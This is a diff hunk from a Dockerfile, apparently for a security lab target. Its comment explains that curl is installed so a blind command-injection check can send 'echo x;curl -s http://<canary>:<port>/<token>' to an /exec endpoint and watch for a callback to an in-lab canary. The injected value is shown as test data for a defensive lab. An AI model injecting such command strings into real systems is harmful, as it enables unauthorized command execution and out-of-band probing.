@@ -17,7 +17,7 @@ RUN cargo build --release --locked ${FEATURES:+--features "$FEATURES"}
 FROM debian:bookworm-slim
 # curl gives the injected command an HTTP client, so the BLIND variant of the
 # check (#87) can make this target call back to the in-lab canary: `/exec` runs
-# `echo x;curl http://<canary>/<token>`, and the token in the canary's logs is the
+# `echo x;curl -s http://<canary>:<port>/<token>`, and the token in the canary's logs is the
 # out-of-band witness. It is installed in BOTH builds so the fixed build's failure
 # to call back is the arg-vector fix (the injected `;curl` is an inert literal
 # argument), not a missing client. http:// needs no CA bundle, so curl alone is
